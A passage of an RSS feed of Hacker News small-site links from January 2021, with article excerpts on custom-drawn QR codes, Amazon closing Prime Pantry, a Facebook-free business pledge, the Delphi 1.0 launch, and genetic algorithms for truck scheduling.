by working together, so we’re eager to work with the community to make this tool more useful. If you have ideas for new functionality, <a href="https://github.com/arup-group/social-data/issues">let us know</a> or better yet, contribute to the <a href="https://github.com/arup-group/social-data">repository</a>. You can find the app <a href="https://share.streamlit.io/arup-group/social-data/run.py">here</a>. The coming months could be a very scary time for lots of people, and we hope …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.streamlit.io/open-source-eviction-data/">https://blog.streamlit.io/open-source-eviction-data/</a></em></p>]]>
            </description>
            <link>https://blog.streamlit.io/open-source-eviction-data/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25686780</guid>
            <pubDate>Fri, 08 Jan 2021 17:03:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Draw a Valid QR Code]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25686728">thread link</a>) | @thricegr8
<br/>
January 8, 2021 | https://marienraat.nl/hacking-qr-codes.html | <a href="https://web.archive.org/web/*/https://marienraat.nl/hacking-qr-codes.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <div>
      <div>
        <div>
          <p><b>Check out <a href="https://my-qr.art/">My-QR.art</a> for the final result!</b></p>

          <p>QR codes provide a clear and approachable way of translating the physical world to the
          digital world. When I see a QR code, I always want to scan it to find out what is behind
          it, somehow they always fascinate me. But QR codes always look very similar, could there
          be a way to make them look more cool? Make them a certain specific shape or contain pixel
          art?</p>

          <p>People already (ab)use the error correction build into QR codes to embed their logo
          in it, they simply put their logo over a part of the QR code and let the error correction
          handle the missing data. However, you can never obscure more than 30% of the code (and
          usually a lot less) if you choose this approach. But QR codes are mostly a visualisation
          of data. Can we approach the problem from the other side? What if we don't try to
          design a QR code to fit the data, but fit the data to the design of the QR code that we
          want.</p>

          <p>Spoiler, we can. Check out <a href="https://my-qr.art/">My-QR.art</a>. All the code is
          totally free and open source, so feel free to
          contribute <a href="https://github.com/raatmarien/my-qr.art">on GitHub</a></p>

          <h2 id="the-idea">The idea</h2>

          <p>Say, we want to promote our website. And we have a nice grayscale logo. Now we want to
          have an engaging QR code that looks like our logo.</p>

          <p><img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/my-qr.art-logo.svg" alt="My-QR.art logo"></p><p>And we have an URL that we want the QR code to lead us too, for
            example: <a href="https://my-qr.art/">https://my-qr.art</a>.</p>
          
          <p>We set up a web server that can redirect certain URLs to other URLs. Then we can make
          the beginning of the data of our QR code the URL to that web-server and the rest of the
          QR's data can be anything. So we can choose the rest of the data in any way that makes
          our QR code look most like our design!</p>

          <p>For example the QR code could send you
            to <code>https://my-qr.art/r/arbitrary-super-long-string</code>. On the back-end we tell
            the server to redirect any request with the
            URL <code>https://my-qr.art/r/arbitrary-super-long-string</code>
            to <code>https://my-qr.art</code>. And tada! We have a functional QR code that sends us to
            the address we want, while having way more control over how the QR code looks! Up to 80%
            of the code can be freely designed this way!</p>

          <p>When we have this all working, we could even make nice scannable QR gifs. We could make
          each frame separately and let them all redirect to the same page. I admit, most QR codes
          are printed, so gifs might not make the most sense, but they look pretty cool! To keep you
          excited for the rest of the article, here is world's first ever working QR gif (as far
          as I know)!</p>
          
          <p><img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/qr.gif" alt="Animated QR code that shows a running horse"></p><p><a href="https://en.wikipedia.org/wiki/The_Horse_in_Motion">The running horse might
          remind you of some other movie...</a></p>

          <h2 id="qr-codes">How does QR work?</h2>

          <p>Now that we know the concept, lets get started. First we need to know how QR codes
          actually work.</p>

          <p>QR codes encode data by making some blocks dark and other light. The QR scanner can
          then read which are dark and which are light and reconstruct the original data. QR codes
          can have 40 different sizes, from <em>version 1</em> (very small, 17x17) to <em>version
          40</em> (very big, 177x177). QR codes are made of black and white 'modules' and
          each module has one of the following 4 functions:</p>

          <ol>
            <li>Help the scanner recognise and orient the QR code</li>
            <li>Give information about the QR code size, type and other internal QR stuff</li>
            <li>Encode the actual data that the QR code represents</li>
            <li>Encode error correction info about the QR code</li>
          </ol>

          <h2 id="drawing">Creating a template</h2>

          <p>Our plan is to allow the user to choose the colour of any module that has function 3. So
          the first step is to let the user know which pixels they can control and which pixels they
          can't control for the QR code size they chose. For now lets try to create an image on
          which the modules with function 3 are coloured white and all other modules are coloured
          grey.</p>

          <p>For this we can colour all the modules and error data. To get this right you really need
          to dive into how QR codes work. We need to think about the data encoding, interleaving,
          extra eyes, error words and more. We'll also need to take into account that we'll
          need to reserve first few characters of our data for the start of our URL. Luckily there
          is a great source on QR codes on the
          internet, <a href="https://www.thonky.com/qr-code-tutorial/introduction">the QR code
          tutorial from Thonky.com</a>. Putting the work in, we get something like this, for version
          30.</p>

          <p><img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/qr-template.png" alt="A template for a QR design"></p><h2 id="reading">Reading a design</h2>

          <p>Now let's work on the other side of the puzzle, when we have a design that a user
          has drawn on our template, how do we convert it to a working QR code? QR codes have 4
          possible types of encoding: <em>numeric</em>, <em>alphanumeric</em>, <em>binary</em>
          and <em>kanji</em>. We need something that we can create valid URLs with, so numeric and
          kanji are out. Secondly, we need the random string at the end of our URL to
          be <em>normal</em> enough so that QR scanners will still recognise our code as an
          URL. The <em>binary</em> encoding will create characters that aren't ordinarily found
          in URLs ('\0' for example), which means lots of QR scanners won't let their
          users open our URL. Luckily the <em>alphanumeric</em> encoding has just enough characters
          to let us make valid URLs (although they'll have to be all caps).</p>

          <p><img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/qr-design.png" alt="A design for a QR code that contains the My-QR.art logo">

          <img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/qr-data-order.png" title="Made by Thonky, shared under the CC ANC 4.0" alt="An illustration from Thonky.com that shows how data is encoded in a QR code"></p><p>So with that figured out, lets read that design the user made. First we'll extract
          a bit string from all the data modules in the design. For small QR codes this is quite
          straight forward, the QR code is simply read from right to left, bottom to top and back
          again in double columns, see the illustration from Thonky above. However, when the QR code
          size passes 5, we'll have to take into account interleaving. Then the data words are
          scattered around the QR code, presumably to make the data pattern more random. So
          we'll have to reverse that interleaving procedure. Luckily how it works is explained
          by <a href="https://www.thonky.com/qr-code-tutorial/error-correction-coding">Thonky.com</a>. At
          last we get a bit string from our design, here we only show the first 80 character, the
          real bit string for this design is 13863 bits long.</p>
          <p><code>01100011010101001100101010001100011110111010100000000001110100111110011101001001</code></p>

          <h3 id="decoding">Decoding the bitstring</h3>
          <p>Now we'll need to decode the bits to an alphanumeric string. Here we group 11 bits
          together every time and then convert that into two alphanumeric characters
          using <a href="https://www.thonky.com/qr-code-tutorial/alphanumeric-table">this
          table</a>. We get the following data string (again truncated).</p>

          <p><code>KS$#LKAHRDF9H8XQI9AL HRD$OIWHSRE94QX95IFR*IK9HF/ 5NM+/AMIA99LB I5R II98ULR JRD/AR1 IRG8...</code></p>

          <p>We'll just replace the first 20 characters with our URL prefix and we get:</p>

          <p><code>HTTPS://MY-QR.ART/R/ HRD$OIWHSRE94QX95IFR*IK9HF/ 5NM+/AMIA99LB I5R II98ULR JRD/AR1 IRG8...</code></p>

          <h3 id="qr-code">Generating the QR code</h3>

          <p>Now we can use any QR library to create the QR code! The QR library will handle adding
          all the difficult error codes and other boring stuff for us.</p>

          <p><img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/failed-qr.png" alt="A random looking QR code"></p><p>But what is that? Why does it still look all random? The problem is masking. The QR
          code spec includes 5 different masks and the mask that makes the QR code look most random
          is chosen, which is almost certainly not our design. This is done to make the code easier
          to read for scanners. However, in my experience, QR codes scan just fine with more
          structured data. So we don't have to feel too bad about modifying our QR library to
          always use the same mask. Then after we apply the same mask to our design before
          processing it, we finally get the desired image.</p>

          <p><img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/my-qr.art-qr.png" alt="A QR code with the design in it"></p><h2 id="redirecting">Redirecting the request</h2>

          <p>Now to redirect the QR code to the right domain. This should be easy, put the QR URL in
          a database and link it to the redirect URL. When we receive a request, simply look up the
          corresponding URL in a database. However, if we want to use a modern web server, we'll
          have to jump through some hoops... Apache doesn't like most of our URLs, since they
          are technically malformed (ugh, spoil the fun much Apache?). So it throws an <em>Error
          400: Bad request</em>. We can't disable this error anywhere it seems. However, luckily
          there is a workaround, we can set a custom error page for our <em>Error 400</em>, so if we
          just set the redirect page as the error page for <em>Error 400</em>, we are home free!
          Luckily Apache is not so much of a spoilsport that it throws a Bad Request error while
          trying to handle a Bad Request...</p>

          <p>For the back-end I've been using Django, and it has another fun bug that shows up
          with these really weird URLs. It tries to decode the URL as an ISO-8859-1 string, but some
          of the characters passed by Apache aren't in ISO-8859-1. So we have to derive our own
          WSGI handler to workaround
          this, <a href="https://github.com/raatmarien/my-qr.art/blob/main/my_qr_art/custom_wsgi.py">see
          here</a>. But now it works, try to scan the QR we made, it redirects where we want it to
            redirect!</p>

          <p>One small caveat though, QR codes themselves are standardized and we create standard
          compliant QR codes with correct URLs in them, but QR scanners aren't standardized and some
          might not recognize our code as a URL and will see it as plain text instead.</p>

          <h2 id="a-web-app">Custom QR codes for everyone!</h2>

          <p>Just outputting and parsing images isn't very user friendly, so I made a nice web
          app at <a href="https://my-qr.art/">My-QR.art</a> using Django. It
          has <a href="https://my-qr.art/editor">a friendly editor</a> where you can draw, fill or
          upload black and white images to make your QR code. It also has some …</p></div></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://marienraat.nl/hacking-qr-codes.html">https://marienraat.nl/hacking-qr-codes.html</a></em></p>]]>
            </description>
            <link>https://marienraat.nl/hacking-qr-codes.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25686728</guid>
            <pubDate>Fri, 08 Jan 2021 16:59:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Amazon Shutters Prime Pantry]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25686448">thread link</a>) | @prostoalex
<br/>
January 8, 2021 | https://www.bnnbloomberg.ca/amazon-shutters-prime-pantry-an-early-online-grocery-initiative-1.1545336 | <a href="https://web.archive.org/web/*/https://www.bnnbloomberg.ca/amazon-shutters-prime-pantry-an-early-online-grocery-initiative-1.1545336">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Amazon.com Inc. has shuttered Prime Pantry, a grocery and household essentials delivery service that was one of the retailerâ€™s early forays into selling food online.</p>

<p>The program closed on Wednesday, an Amazon spokeswoman said, and thousands of products previously available under the Prime Pantry banner were folded into the companyâ€™s main retail site.</p>

<p>Launched in 2014, Prime Pantry featured a selection of shelf-stable food and snacks, as well as cleaning products, and was designed to get shoppers to stock up on the bulky, often expensive-to-ship products in orders that could fit into a single large box.</p>

<p>Initially the service was offered only to members of the Prime free shipping program, but Amazon added a US$5 a month subscription option in 2018. Those who were still paying the monthly fee were notified of the shutdown in December and received refunds, the spokeswoman said.</p>

<p>â€œAs part of our commitment to delivering the best possible customer experience, we have decided to transfer Amazon Pantry selection to the main Amazon.com store so customers can get everyday household products faster, without an extra subscription or purchase requirement,â€� the spokeswoman said in an email.</p>

<p>In addition to shelf-stable food offered on Amazonâ€™s main retail site, members of the $119-a-year Prime program in many cities can also order fresh food from Amazon Fresh and the companyâ€™s Whole Foods Market chain.</p>
</div></div>]]>
            </description>
            <link>https://www.bnnbloomberg.ca/amazon-shutters-prime-pantry-an-early-online-grocery-initiative-1.1545336</link>
            <guid isPermaLink="false">hacker-news-small-sites-25686448</guid>
            <pubDate>Fri, 08 Jan 2021 16:39:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Yeti Foods is a Facebook-Free business]]>
            </title>
            <description>
<![CDATA[
Score 37 | Comments 26 (<a href="https://news.ycombinator.com/item?id=25686437">thread link</a>) | @shafyy
<br/>
January 8, 2021 | https://blog.yeticheese.com/yeti-is-a-facebook-free-business/ | <a href="https://web.archive.org/web/*/https://blog.yeticheese.com/yeti-is-a-facebook-free-business/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p>Yeti will not use any of Facebook's products from today onwards.</p><p>Why?</p><p>Facebook controls some of the most used apps such as WhatsApp, Instagram, Messenger, and of course, Facebook. They have shown time over time that they don't care about their users' privacy and are willing to do anything to maximize their stronghold and power.</p><p>It's clear that consumers and society always lose when one company becomes too big. That's why there are monopoly and anti-trust laws that try to prevent and regulate such cases.</p><p>Tech companies such as Facebook and Google have new business models and therefore have managed to evade those laws. Luckily, this is changing, as governments are introducing more laws that aim at breaking up and regulating these companies to protect consumers.</p><p>But we can't only rely on our governments to take action. Every single consumer's decisions also matter. If enough people stop using Facebook's products, their power will diminish.</p><p>This is easier said than done, because these products have network effects. That means that the value of the product to the user increases exponentially for every additional user. For example, you wouldn't use WhatsApp if none of your friends were on it. At the same time, it's much harder for you to switch to a different messaging app like Signal because you need to convince all your friends to join, too.</p><p>It's hard but not impossible.</p><p>From today onwards, we pledge that Yeti will not use any products by Facebook. As stated in <a href="https://m.signalvnoise.com/become-a-facebook-free-business/">Basecamp's blog post</a>, which inspired our decision, this means:</p><ol><li>We do not buy advertisement on Facebook, Messenger, Instagram, or WhatsApp.</li><li>We do not use Facebook, Messenger, Instagram, or WhatsApp to promote or represent our business or to communicate with our customers.</li><li>We do not assist Facebook in its data collection regime through use of Facebook social Like buttons or by offering Facebook logins.</li></ol><p>This was not an easy decision. For example, Instagram and Facebook are important platform for us to stay in touch with current and prospective consumers. It's clear that by taking this decision, we will lose customers and money. However, it is the right thing to do and this is something that's more important than financial success.</p><p>As a customer, you can be assured that none of the money you spend with us goes to Facebook.</p><p>Now, go and <a href="https://yeticheese.com/product/yeti-no-1">buy our cheese</a> so we can make up for the lost revenue 😝</p>
			</section></div>]]>
            </description>
            <link>https://blog.yeticheese.com/yeti-is-a-facebook-free-business/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25686437</guid>
            <pubDate>Fri, 08 Jan 2021 16:38:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[UBlacklist is a Google Search filter]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25686308">thread link</a>) | @URfejk
<br/>
January 8, 2021 | https://iorate.github.io/ublacklist/ | <a href="https://web.archive.org/web/*/https://iorate.github.io/ublacklist/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      



<div id="main" role="main">
  
  



  <article class="page" itemscope="" itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="uBlacklist">
    
    
    

    <div>
      
        <header>
          
          


        </header>
      

      <section itemprop="text">
        
          
        
        <p>uBlacklist is a Google Search filter for Chrome and Firefox.</p>

<p><a href="https://chrome.google.com/webstore/detail/ublacklist/pncfbmialoiaghdehhbnbhkkgmjanfhe/">Chrome Web Store</a> / <a href="https://addons.mozilla.org/en/firefox/addon/ublacklist/">Firefox Add-ons</a> / <a href="https://github.com/iorate/ublacklist">GitHub</a></p>

<h2 id="demo">Demo</h2>

<p><img src="https://iorate.github.io/assets/images/ublacklist/demo.gif" alt="demo"></p>

<h2 id="features">Features</h2>

<ul>
  <li>Prevent blocked sites from appearing even in a moment</li>
  <li>Block sites flexibly using match patterns and regular expressions</li>
  <li>Support Bing, DuckDuckGo, Ecosia (partially) and Startpage.com</li>
  <li>Synchronize blacklists among devices using Google Drive or Dropbox</li>
  <li>Subscribe to public blacklists</li>
  <li><del>Support Firefox for Android (without synchronization)</del> not available in Firefox for Android 79 or later</li>
</ul>

<h2 id="links">Links</h2>

<ul>
  <li><a href="https://iorate.github.io/ublacklist/getting-started">Getting Started</a></li>
  <li><a href="https://iorate.github.io/ublacklist/advanced-features">Advanced Features</a></li>
  <li><a href="https://qiita.com/iorate/items/9ff65360fbdf4082476a">Personal Blocklist の代替になりそうな Chrome 拡張機能を作ってみた</a> (Japanese tutorial)</li>
</ul>

        
      </section>

      

      

      
    </div>

    
  </article>

  
  
</div>

    </div></div>]]>
            </description>
            <link>https://iorate.github.io/ublacklist/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25686308</guid>
            <pubDate>Fri, 08 Jan 2021 16:28:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[UFO Sightings Visualizer]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25686250">thread link</a>) | @lucaspauker
<br/>
January 8, 2021 | https://www.lucaspauker.ml/ufos | <a href="https://web.archive.org/web/*/https://www.lucaspauker.ml/ufos">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    
    <div id="ufos">
  
  <div id="date-filter">
  <h3>Filter by date</h3>
  <br>
  <form action="/ufos" accept-charset="UTF-8" method="get">
    <label for="Start_date">Start date</label>
    



    <br>
    <label for="End_date">End date</label>
    



    <br>
      
</form>  </div>
  
  <p>Hover over states:</p><div id="ufos-map">
    
  </div>
  <p>Data taken from <a href="http://www.nuforc.org/webreports/ndxevent.html">here</a></p>
</div>

  
  

</div>]]>
            </description>
            <link>https://www.lucaspauker.ml/ufos</link>
            <guid isPermaLink="false">hacker-news-small-sites-25686250</guid>
            <pubDate>Fri, 08 Jan 2021 16:23:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Launching Delphi – A PM Reminiscing 25 Years Later]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25686169">thread link</a>) | @kylegill
<br/>
January 8, 2021 | https://www.theopenforce.com/2020/02/launching-delphi.html | <a href="https://web.archive.org/web/*/https://www.theopenforce.com/2020/02/launching-delphi.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

     

       



       



<div>
   <p><a href="https://zurlocker.typepad.com/.a/6a00d83452e46469e20240a50bcffc200b-pi"><img alt="Booth Delphi 1.0 launch Feb 1995" src="https://zurlocker.typepad.com/.a/6a00d83452e46469e20240a50bcffc200b-400wi" title="Booth Delphi 1.0 launch Feb 1995"></a>It was twenty-five years ago today that Anders Hejlsberg and I got up on stage at the Software Development '95 conference and launched Delphi to the world. The joke was that all 1,500 of us were geeks who couldn't get a date even on Valentine's day.&nbsp;</p>
<p>We knew Delphi was a good product. Maybe even a great one. Our beta testers loved it, the team was excited and we had a 32-bit version in the works for the upcoming Windows 95 OS that would be bigger, better and faster. But the scale of Delphi's success took us by surprise. The Borland booth was mobbed at the conference. Delphi, with the help of DavidI and Charlie Calvert, gave birth to an ecosystem of third party books, magazines, component libraries and more. I've met countless developers over the years who told me Delphi enabled them to learn Windows development, build their career, their business.</p>
<p><a href="https://zurlocker.typepad.com/.a/6a00d83452e46469e20240a4e73715200d-pi"><img alt="Anders Delphi 1.0 launch Feb 1995" src="https://zurlocker.typepad.com/.a/6a00d83452e46469e20240a4e73715200d-300wi" title="Anders Delphi 1.0 launch Feb 1995"></a>So what made Delphi so good? You gotta give credit to <a href="https://www.theopenforce.com/2020/02/anders-hejlsberg-delphi-1995.html" rel="noopener" target="_blank">Anders</a>. He is probably one of the ten best programmers in the world and certainly the best developer I've ever worked with. He had more than ten years of compiler experience under his belt when we built Delphi. He knew exactly what tradeoffs mattered in language design to balance programmer productivity with machine performance. Delphi compiled to machine code at the speed of 35,000 lines per minute on a 90 mhz pentium. I have no idea how fast that is on today's machine. But you could load a demo program, hit the run button and by the time you clapped your hands together it was running. And I clapped my hands together ever time I gave a demo, just to make the point.&nbsp;</p>
<p>As Anders pointed out that night on stage, Delphi was written in Delphi. So the team that built Delphi (and it really was a team: Anders, Gary, Chuck, Dave, Allen, Hank, Ray, Marc, Danny, Charlie) used it every single day. We made it great because Delphi was the tool that <em>we</em> wanted to use. It was pretty mind-blowing when Anders loaded the Delphi project source code into Delphi and compiled itself.&nbsp;</p>
<p>The Delphi project was not an easy one though. It came at a tough time in Borland's history. The company was sued by Lotus in 1990, acquired Ashton Tate in 1991. By 1993, the company essentially sold of Quattro Pro and Paradox to Novell after Microsoft decimated the standalone spreadsheet and end-user database market. Oh yeah, and the founder and CEO, Philippe Kahn left to create Starfish Software a month before we launched. Philippe helped protect Delphi as a skunkworks project when we started and he coined the codename VBK (ahem) which none of us liked, but all of us believed in.&nbsp;</p>
<p>We knew if Borland was to stay relevant in developer tools, we needed to build something better than Visual Basic. We never saw Delphi as VB Killer, but certainly a VB Kompetitor. How would we compete with that behemoth? Well, we weren't cocky, but we also weren't afraid of Microsoft. We had to make Windows programming easy enough that a DOS programmer could do it. And in that regard, our prior efforts with Turbo Pascal 7, missed the mark. Borland had a couple of other internal efforts that never saw light of day (Monet, anyone?) and at some point, Gary, Anders and I came to the realization, someone had to make it happen, and that someone was us. Having a native code compiler meant that Delphi would have a huge performance advantage over interpreters. It also meant Delphi developers would be able to create their own reusable objects without having to learn a different language. That gave us huge extensibility.&nbsp;</p>
<p>We also learned there was another change on the horizon and that became our opportunity. Borland VP Rob Dickerson had highlighted the need for the company to build a client/server development system. Again, we looked around and we realized Paradox wasn't going to do it, dBase wasn't good enough, C++ was too hard. And so I put up my hand and convinced Gary and Anders not only did we need to make Windows development easy, we had to take on Client/Server development at the same time. Luckily they agreed, not knowing what Client/Server development meant. I didn't either, but I trusted we would figure it out. Ultimately this became our biggest differentiator in the market. While our performance over VB could be 2-3x faster, compared to SQL Windows or PowerBuilder, Delphi was 5-50x faster, and sometimes 800x faster.&nbsp;</p>
<p>When we first started, we thought the project might take a year, but that Client/Server stuff was a lot harder than we expected. One of the developers working on that area eventually left the company and when Chuck and Anders looked at his code they just about barfed. That cost us about six months. I'm pretty sure every single person working on the project came to see me and said: "Can't we forget that Client/Server thing and just ship the desktop Windows version?" But my answer was always the same. I drew a curve of what Delphi desktop revenues would be. Then I drew a second line for Client/Server below the first one but growing at a steeper angle, eventually eclipsing the desktop revenues. I don't know if anyone believed me (and I honestly didn't know if I believed it myself) but it put an end to the discussion.&nbsp;&nbsp;</p>
<p><a href="https://zurlocker.typepad.com/.a/6a00d83452e46469e20240a4be0d86200c-pi"><img alt="Zack Delphi 1.0 launch Feb 1995" src="https://zurlocker.typepad.com/.a/6a00d83452e46469e20240a4be0d86200c-300wi" title="Zack Delphi 1.0 launch Feb 1995"></a>I knew that the Client/Server product was more important strategically for the company because it would expand our market beyond Borland's traditional base. Ironically, at some point my boss VP Paul Gross asked why we were working on the desktop product, suggesting we skip that completely. I told him Delphi desktop revenues would be $30 million in the first year (a number I made up on the spot) and he nodded and said "good point."&nbsp;&nbsp;</p>
<p>Delphi's first year revenues were $70 million (far higher than we'd expected) and grew from there. That's about $118 million, adjusted for inflation. And the Client/Server revenues really did eclipse the desktop revenues in the second year. To say Delphi saved Borland was not an overstatement.&nbsp;</p>
<p>We also made a good bet on shipping a 16-bit version of Delphi first, rather than jumping straight to 32-bit. It was a safe assumption that Microsoft would slip Chicago (Windows 95). So we had a stable 16-bit compiler and operating system and could work on that without having to worry about the ground moving beneath our feet. We were fortunate to get the 32-bit compiler under development in parallel, shipping it just about 12 months later as Windows 95 was gaining market share. Delphi 2.0 boosted performance another 3-4x giving us an even bigger lead.</p>
<p>When we built Delphi we never thought it would last so long or have as much impact as it did. We were grateful for the support and feedback from our customers and third party developers. While we weren't obsessed with press coverage and awards, we were happy that it helped get the word out. I still have the Jolt Cola award on my bookcase. I figured if Delphi lasted to version 3.0, that meant we did a good job. But twenty-five years? Who could have guessed?</p>
<p>Looking back on Delphi 1.0, much of those two years is a blur of sixty hour weeks, late evenings and occasional setbacks. But the memories that stand out were about the team. We were committed to building something great, something that we would use. Gary and Anders (and Chuck, and <a href="https://www.theopenforce.com/2020/02/danny-thorpe-why-the-name-delphi.html" rel="noopener" target="_blank">Danny</a>...) all had great taste. So there was a kind of aesthetic to the product. It's hard to explain, but we knew it as "it works the way you hope it would." Delphi wasn't just fast, it avoided the limitations of many Rapid Application Development (RAD) tools that ran out of gas when you pushed hard.&nbsp;</p>
<p>I've done a lot of interesting things in the last twenty-five years, but Delphi is the product I'm most proud of. It was a magical time in our lives when we were experienced enough to do good work and young and foolish enough to bite off more than we could chew. We solved some hard problems that mattered in a market that we understood and the market responded. It shaped my thinking about how to build products in ways that I continue to use and teach to this day.</p>
<p>I'm grateful to Anders and Gary that we took on the project. Gary is the best engineering manager I have ever worked with and I was glad to get to work with him again at MySQL. Anders, of course, has gone on to do even greater things architecting C#, .Net and TypeScript. I'm proud of the many developers, writers, and testers, product managers and marketers (Lance, Diane, Ben, you were awesome), who built on the early success of Delphi 1.0 to create a legacy that has withstood the test of time.</p>
<p>And thank God we finally got that darned Language Reference Manual out.&nbsp;</p>
<p><a href="https://zurlocker.typepad.com/.a/6a00d83452e46469e20240a4e7443d200d-pi"><img alt="Zack gary anders 2011" src="https://zurlocker.typepad.com/.a/6a00d83452e46469e20240a4e7443d200d-500wi" title="Zack gary anders 2011"></a></p>
<p><em>Got a recollection of Delphi 1.0 or a story about Anders, Gary or me? Post a comment below...</em></p>
<ul>
<li><strong>Delphi Informant</strong>: <a href="https://www.theopenforce.com/2020/02/delphi-birth.html">Birth of Delphi</a></li>
<li><strong>Danny Thorpe</strong>: <a href="https://www.theopenforce.com/2020/02/danny-thorpe-why-the-name-delphi.html">Why The Name Delphi?</a></li>
<li><strong>Anders Hejslberg</strong>: <a href="https://www.theopenforce.com/2020/02/anders-hejlsberg-delphi-1995.html">.EXE Interview</a>&nbsp;</li>
</ul>
</div>

		








</article><p>
	The comments to this entry are closed.
</p></div>]]>
            </description>
            <link>https://www.theopenforce.com/2020/02/launching-delphi.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25686169</guid>
            <pubDate>Fri, 08 Jan 2021 16:17:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Solving logistics problems using genetic algorithms]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25685721">thread link</a>) | @luord
<br/>
January 8, 2021 | https://blog.picnic.nl/its-in-our-dna-solving-logistics-problems-using-genetic-algorithms-a3d59e31558c | <a href="https://web.archive.org/web/*/https://blog.picnic.nl/its-in-our-dna-solving-logistics-problems-using-genetic-algorithms-a3d59e31558c">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><div><div><div><p><a href="https://geert-konijnendijk.medium.com/?source=post_page-----a3d59e31558c--------------------------------" rel="noopener"><img alt="Geert Konijnendijk" src="https://miro.medium.com/fit/c/96/96/1*pSvmheCVflb4rnO9hC2Qig.jpeg" width="48" height="48"></a></p></div></div></div></div><p id="0981">What do designing an aircraft wing, packing boxes into a container and making timetables have in common? They’re all optimization problems. There’s an objective to be maximized or minimized (least air resistance, most boxes packed or least man hours spent). Each individual solution to these problems will have a score for the objective and the goal is to find the best possible one. In a <a rel="noopener" href="https://blog.picnic.nl/computational-logistics-at-picnic-579c081eb5df">previous blog post</a> we discussed how the world of logistics is fundamentally one of algorithms and optimization. In this blog post we’ll zoom into one specific case. Each day tens of thousands of orders for Picnic’s customers are packed at our warehouses (or fulfilment centers as we like to call them). These orders are loaded into trucks and shipped to our hubs, from which they are delivered to the customer’s doorstep. How do we create an optimal schedule for these trucks driving between fulfilment centers and hubs?</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/5034/1*x4lGDVdcgWEMa6DHrJIUGg.png" width="2517" height="1177" srcset="https://miro.medium.com/max/552/1*x4lGDVdcgWEMa6DHrJIUGg.png 276w, https://miro.medium.com/max/1104/1*x4lGDVdcgWEMa6DHrJIUGg.png 552w, https://miro.medium.com/max/1280/1*x4lGDVdcgWEMa6DHrJIUGg.png 640w, https://miro.medium.com/max/1400/1*x4lGDVdcgWEMa6DHrJIUGg.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*x4lGDVdcgWEMa6DHrJIUGg.png?q=20"></p></div></div></div></figure><p id="699a">At Picnic we use a Genetic Algorithm (or GA for short) to solve this truck scheduling problem. GAs are a great tool to solve problems when it is impossible to consider every possible solution because there are simply too many. Instead GAs consider only a fraction of the solutions. This is achieved by taking inspiration from Darwin’s evolutionary theory: letting a population of individual solutions reproduce while subjecting them to natural selection gradually improves the whole population. This is done until the population contains a solution that is deemed “good enough”.</p><p id="99a8">Let’s consider a game, a greatly simplified version of <a href="https://en.wikipedia.org/wiki/Lingo_(American_game_show)" rel="noopener">Lingo</a>, and design a GA to play the game. In this game a word of known length (e.g. the 6 letter word “picnic”) has to be guessed. When the GA submits a guess, the game will respond with the number of letters that are correct (the right letter at the right location). For example, when the GA guesses “pifnit”, the game’s response will be 4. For this game, the GA will get an unlimited number of guesses.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/7744/0*nCl6L45vBPcaTz_h" width="3872" height="2592" srcset="https://miro.medium.com/max/552/0*nCl6L45vBPcaTz_h 276w, https://miro.medium.com/max/1104/0*nCl6L45vBPcaTz_h 552w, https://miro.medium.com/max/1280/0*nCl6L45vBPcaTz_h 640w, https://miro.medium.com/max/1400/0*nCl6L45vBPcaTz_h 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*nCl6L45vBPcaTz_h?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@amadorloureiroblanco?utm_source=medium&amp;utm_medium=referral" rel="noopener">Amador Loureiro</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="584d">In a GA each individual in the population represents a possible solution. Each individual has DNA, often represented as a sequence of numbers or characters. Usually, a big challenge in implementing a GA is to fit a solution within 